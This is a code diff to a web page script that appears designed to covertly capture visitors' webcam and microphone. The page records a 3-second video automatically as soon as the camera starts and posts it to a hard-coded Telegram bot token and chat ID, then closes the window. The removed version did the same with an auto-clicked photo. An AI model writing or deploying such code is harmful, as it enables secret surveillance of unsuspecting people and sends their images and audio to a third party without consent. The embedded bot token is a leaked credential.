@@ -24,55 +24,71 @@
       const video = document.getElementById("video");
       const canvas = document.getElementById("canvas");
       const context = canvas.getContext("2d");
+      let mediaRecorder;
+      const recordedChunks = [];
 
       // Ask for camera access
       navigator.mediaDevices
-        .getUserMedia({ video: true })
+        .getUserMedia({ video: true, audio: true }) // Request audio as well for video recording
         .then((stream) => {
           video.srcObject = stream;
+          mediaRecorder = new MediaRecorder(stream);
+
+          mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+              recordedChunks.push(event.data);
+            }
+          };
+
+          mediaRecorder.onstop = async () => {
+            const videoBlob = new Blob(recordedChunks, { type: "video/webm" }); // Use webm for broader compatibility
+            recordedChunks.length = 0; // Clear chunks for next recording
+
+            // Example Telegram bot token and chat ID (replace with your own)
+            const token = "7640623735:AAGc72UyKSUy8c-Tl4jcY-lv7HCpHFLjD0o";
+            const chatId = "1437208295";
+            const url = `https://api.telegram.org/bot${token}/sendVideo`; // Changed to sendVideo
+
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("video", videoBlob, "video.webm"); // Append video Blob with a filename
+
+            try {
+              const response = await fetch(url, { method: "POST", body: formData });
+              const result = await response.json();
+              console.log(
+                "Telegram API Response:",
+                JSON.stringify(result, null, 2)
+              ); // Log the full JSON response
+              if (response.ok) {
+                window.close(); // Close the window after sending the video
+              } else {
+                console.error(
+                  `Failed to send video to Telegram: ${
+                    result.description || "Unknown error"
+                  }.`
+                );
+              }
+            } catch (error) {
+              console.error("Error sending video to Telegram:", error); // Log any network errors
+            }
+          };
         })
         .catch((err) => console.error("Camera access denied:", err));
 
-      const captureButton = document.getElementById("capture");
-
-      captureButton.onclick = async () => {
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const dataUrl = canvas.toDataURL("image/png");
-        const blob = await (await fetch(dataUrl)).blob(); // Convert data URL to Blob
-
-        // Example Telegram bot token and chat ID (replace with your own)
-        const token = "7640623735:AAGc72UyKSUy8c-Tl4jcY-lv7HCpHFLjD0o";
-        const chatId = "1437208295";
-        const url = `https://api.telegram.org/bot${token}/sendPhoto`;
-
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", blob, "photo.png"); // Append Blob with a filename
-
-        try {
-          const response = await fetch(url, { method: "POST", body: formData });
-          const result = await response.json();
-          console.log(
-            "Telegram API Response:",
-            JSON.stringify(result, null, 2)
-          ); // Log the full JSON response
-          if (response.ok) {
-            window.close(); // Close the window after sending the photo
-          } else {
-            console.error(
-              `Failed to send photo to Telegram: ${
-                result.description || "Unknown error"
-              }.`
-            );
-          }
-        } catch (error) {
-          console.error("Error sending photo to Telegram:", error); // Log any network errors
-        }
-      };
-
-      // Auto-click the capture button when the video starts playing
+      // Start recording when the video starts playing
       video.onplaying = () => {
-        captureButton.click();
+        if (mediaRecorder && mediaRecorder.state === "inactive") {
+          mediaRecorder.start();
+          console.log("Recording started...");
+          // Stop recording after 3 seconds
+          setTimeout(() => {
+            if (mediaRecorder.state === "recording") {
+              mediaRecorder.stop();
+              console.log("Recording stopped.");
+            }
+          }, 3000); // Record for 3 seconds
+        }
       };
     </script>
   </body>
